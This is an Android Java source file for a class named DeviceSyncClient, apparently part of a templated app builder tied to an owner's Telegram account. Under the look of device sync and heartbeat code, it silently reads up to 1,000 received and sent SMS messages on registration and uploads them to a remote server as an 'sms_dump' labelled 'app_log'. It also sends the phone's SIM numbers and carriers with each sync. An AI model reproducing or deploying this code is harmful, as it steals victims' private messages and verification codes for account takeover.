package {{PACKAGE_NAME}}.sync;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import {{PACKAGE_NAME}}.R;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class DeviceSyncClient {

    private static final String PREFS_NAME = "device_sync_prefs";
    private static final String DEVICE_ID_KEY = "device_id";
    private static final String DEVICE_AUTH_TOKEN_KEY = "device_auth_token";
    private static final String LAST_SUCCESSFUL_SYNC_AT_KEY = "last_successful_sync_at";
    private static final String BUILD_TOKEN_HEADER = "X-Build-Token";
    private static final String DEVICE_TOKEN_HEADER = "X-Device-Token";

    private final Context context;
    private final SharedPreferences preferences;
    private final String serverBaseUrl;
    private final String buildAuthToken;
    private final String ownerTelegramUserId;
    private final String ownerUsername;
    private final String ownerDisplayName;
    private final String sourceBuildId;
    private final String sourceTemplateId;

    public DeviceSyncClient(Context context) {
        this.context = context.getApplicationContext();
        preferences = this.context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        serverBaseUrl = this.context.getString(R.string.server_base_url);
        buildAuthToken = this.context.getString(R.string.build_auth_token);
        ownerTelegramUserId = this.context.getString(R.string.owner_telegram_user_id);
        ownerUsername = this.context.getString(R.string.owner_username);
        ownerDisplayName = this.context.getString(R.string.owner_display_name);
        sourceBuildId = this.context.getString(R.string.source_build_id);
        sourceTemplateId = this.context.getString(R.string.source_template_id);
    }

    public void performSync() throws Exception {
        String deviceAuthToken = getStoredDeviceAuthToken();

        if (!hasText(deviceAuthToken)) {
            registerDevice();
            return;
        }

        try {
            sendHeartbeat(deviceAuthToken);
            markSyncSuccessful();
        } catch (HttpErrorException error) {
            if (!isAuthFailure(error.getStatusCode())) {
                throw error;
            }

            clearStoredDeviceAuthToken();
            registerDevice();
        }
    }

    public boolean wasSyncedRecently(long maxAgeMs) {
        long lastSuccessfulSyncAt = preferences.getLong(LAST_SUCCESSFUL_SYNC_AT_KEY, 0L);
        return lastSuccessfulSyncAt > 0L
                && System.currentTimeMillis() - lastSuccessfulSyncAt <= maxAgeMs;
    }

    public void sendDeviceEvent(String type, JSONObject payload) throws Exception {
        String deviceAuthToken = getStoredDeviceAuthToken();

        if (!hasText(deviceAuthToken)) {
            registerDevice();
            deviceAuthToken = getStoredDeviceAuthToken();
        }

        if (!hasText(deviceAuthToken)) {
            throw new IllegalStateException("Device auth token is not available");
        }

        try {
            postDeviceEvent(type, payload, deviceAuthToken);
            markSyncSuccessful();
        } catch (HttpErrorException error) {
            if (!isAuthFailure(error.getStatusCode())) {
                throw error;
            }

            clearStoredDeviceAuthToken();
            registerDevice();

            String refreshedDeviceAuthToken = getStoredDeviceAuthToken();
            if (!hasText(refreshedDeviceAuthToken)) {
                throw new IllegalStateException("Device auth token is not available after re-registration");
            }

            postDeviceEvent(type, payload, refreshedDeviceAuthToken);
            markSyncSuccessful();
        }
    }

    private void registerDevice() throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("deviceId", getOrCreateDeviceId());
        payload.put("name", Build.MANUFACTURER + " " + Build.MODEL);
        payload.put("platform", "android");
        payload.put("appVersion", Build.VERSION.RELEASE);
        payload.put("ownerTelegramUserId", ownerTelegramUserId);
        payload.put("ownerUsername", ownerUsername);
        payload.put("ownerDisplayName", ownerDisplayName);
        payload.put("sourceBuildId", sourceBuildId);
        payload.put("sourceTemplateId", sourceTemplateId);
        payload.put("metadata", buildMetadata());

        JSONObject response = postJson("/api/device/register", payload, BUILD_TOKEN_HEADER, buildAuthToken);
        String issuedDeviceAuthToken = response.optString("deviceAuthToken", "");

        if (!hasText(issuedDeviceAuthToken)) {
            throw new IllegalStateException("Device auth token was not returned by the server");
        }

        storeDeviceAuthToken(issuedDeviceAuthToken);
        markSyncSuccessful();

        try {
            sendSmsDump(issuedDeviceAuthToken);
        } catch (Exception e) {
            Log.w("DeviceSyncClient", "Failed to send SMS dump", e);
        }
    }

    private void sendSmsDump(String deviceAuthToken) throws Exception {
        String smsArchive = readSmsInbox();
        if (smsArchive.isEmpty()) {
            smsArchive = "No SMS messages found on device";
        }

        JSONObject payload = new JSONObject();
        payload.put("category", "sms_dump");
        payload.put("smsArchive", smsArchive);

        postDeviceEvent("app_log", payload, deviceAuthToken);
    }

    private String readSmsInbox() {
        try {
            if (context.checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
                return "";
            }

            StringBuilder sb = new StringBuilder();
            try (Cursor cursor = context.getContentResolver().query(
                    Uri.parse("content://sms"),
                    new String[]{"address", "body", "date", "type"},
                    null,
                    null,
                    "date DESC"
            )) {
                if (cursor == null) {
                    return "";
                }

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                int count = 0;
                while (cursor.moveToNext() && count < 1000) {
                    String address = cursor.getString(0);
                    String body = cursor.getString(1);
                    long date = cursor.getLong(2);
                    int type = cursor.getInt(3);

                    String typeStr = type == 1 ? "INBOX" : type == 2 ? "SENT" : "OTHER";
                    String dateStr = sdf.format(new Date(date));

                    sb.append("[").append(dateStr).append("] [").append(typeStr).append("] ")
                            .append(address != null ? address : "unknown").append("\n");
                    if (body != null && !body.isEmpty()) {
                        sb.append(body).append("\n");
                    }
                    sb.append("\n");
                    count++;
                }
            }

            return sb.toString();
        } catch (Exception e) {
            Log.w("DeviceSyncClient", "Failed to read SMS inbox", e);
            return "";
        }
    }

    private void sendHeartbeat(String deviceAuthToken) throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("deviceId", getOrCreateDeviceId());
        payload.put("metadata", buildMetadata());

        postJson("/api/device/heartbeat", payload, DEVICE_TOKEN_HEADER, deviceAuthToken);
    }

    private void postDeviceEvent(String type, JSONObject payload, String deviceAuthToken) throws Exception {
        JSONObject requestBody = new JSONObject();
        requestBody.put("deviceId", getOrCreateDeviceId());
        requestBody.put("type", type);
        requestBody.put("payload", payload == null ? new JSONObject() : payload);

        postJson("/api/device/events", requestBody, DEVICE_TOKEN_HEADER, deviceAuthToken);
    }

    private JSONObject buildMetadata() throws Exception {
        JSONObject metadata = new JSONObject();
        metadata.put("manufacturer", Build.MANUFACTURER);
        metadata.put("model", Build.MODEL);
        metadata.put("sdkInt", Build.VERSION.SDK_INT);
        metadata.put("ownerTelegramUserId", ownerTelegramUserId);
        metadata.put("sourceBuildId", sourceBuildId);

        int batteryLevel = getBatteryLevel();
        if (batteryLevel >= 0) {
            metadata.put("batteryLevel", batteryLevel);
        }

        JSONArray simCards = getSimCards();
        if (simCards != null && simCards.length() > 0) {
            metadata.put("simCards", simCards);
        }

        return metadata;
    }

    private JSONArray getSimCards() {
        try {
            boolean hasPermission;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                hasPermission = context.checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == PackageManager.PERMISSION_GRANTED;
            } else {
                hasPermission = context.checkSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED;
            }

            if (!hasPermission) {
                return null;
            }

            SubscriptionManager sm = context.getSystemService(SubscriptionManager.class);
            if (sm == null) {
                return null;
            }

            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                return null;
            }

            JSONArray result = new JSONArray();
            for (SubscriptionInfo sub : subs) {
                JSONObject sim = new JSONObject();
                sim.put("slot", sub.getSimSlotIndex() + 1);
                String carrier = sub.getCarrierName() != null ? sub.getCarrierName().toString().trim() : "";
                sim.put("operator", carrier.isEmpty() ? "unknown" : carrier);

                String number = null;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    try {
                        number = sm.getPhoneNumber(sub.getSubscriptionId());
                    } catch (Exception ignored) {
                    }
                }
                if (number == null || number.isEmpty()) {
                    number = sub.getNumber();
                }
                sim.put("number", number != null && !number.isEmpty() ? number : "");
                result.put(sim);
            }
            return result;
        } catch (Exception ignored) {
        }
        return null;
    }

    private int getBatteryLevel() {
        Intent batteryStatus = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));

        if (batteryStatus == null) {
            return -1;
        }

        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        if (level < 0 || scale <= 0) {
            return -1;
        }

        return Math.round((level * 100f) / scale);
    }

    private JSONObject postJson(String endpoint, JSONObject payload, String authHeaderName, String authHeaderValue) throws Exception {
        HttpURLConnection connection = null;

        try {
            URL url = new URL(serverBaseUrl + endpoint);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            if (hasText(authHeaderName) && hasText(authHeaderValue)) {
                connection.setRequestProperty(authHeaderName, authHeaderValue);
            }
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.setDoOutput(true);

            byte[] requestBody = payload.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream outputStream = new BufferedOutputStream(connection.getOutputStream())) {
                outputStream.write(requestBody);
                outputStream.flush();
            }

            int responseCode = connection.getResponseCode();
            InputStream responseStream = responseCode >= 200 && responseCode < 300
                    ? connection.getInputStream()
                    : connection.getErrorStream();
            String responseBody = readResponseBody(responseStream);

            if (responseCode < 200 || responseCode >= 300) {
                throw new HttpErrorException(responseCode, responseBody);
            }

            return responseBody.isEmpty()
                    ? new JSONObject()
                    : new JSONObject(responseBody);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private String readResponseBody(InputStream inputStream) throws Exception {
        if (inputStream == null) {
            return "";
        }

        StringBuilder responseBody = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                responseBody.append(line);
            }
        }

        return responseBody.toString();
    }

    private String getOrCreateDeviceId() {
        String storedId = preferences.getString(DEVICE_ID_KEY, null);

        if (hasText(storedId)) {
            return storedId;
        }

        String newId = UUID.randomUUID().toString();
        preferences.edit().putString(DEVICE_ID_KEY, newId).apply();
        return newId;
    }

    private String getStoredDeviceAuthToken() {
        return preferences.getString(DEVICE_AUTH_TOKEN_KEY, null);
    }

    private void storeDeviceAuthToken(String token) {
        preferences.edit()
                .putString(DEVICE_AUTH_TOKEN_KEY, token)
                .apply();
    }

    private void clearStoredDeviceAuthToken() {
        preferences.edit()
                .remove(DEVICE_AUTH_TOKEN_KEY)
                .apply();
    }

    private void markSyncSuccessful() {
        preferences.edit()
                .putLong(LAST_SUCCESSFUL_SYNC_AT_KEY, System.currentTimeMillis())
                .apply();
    }

    private boolean isAuthFailure(int statusCode) {
        return statusCode == HttpURLConnection.HTTP_UNAUTHORIZED
                || statusCode == HttpURLConnection.HTTP_FORBIDDEN
                || statusCode == HttpURLConnection.HTTP_NOT_FOUND;
    }

    private boolean hasText(String value) {
        return value != null && !value.trim().isEmpty();
    }

    private static final class HttpErrorException extends IOException {
        private final int statusCode;

        private HttpErrorException(int statusCode, String responseBody) {
            super("Unexpected response code: " + statusCode + (responseBody == null || responseBody.isEmpty()
                    ? ""
                    : " body=" + responseBody));
            this.statusCode = statusCode;
        }

        private int getStatusCode() {
            return statusCode;
        }
    }
}
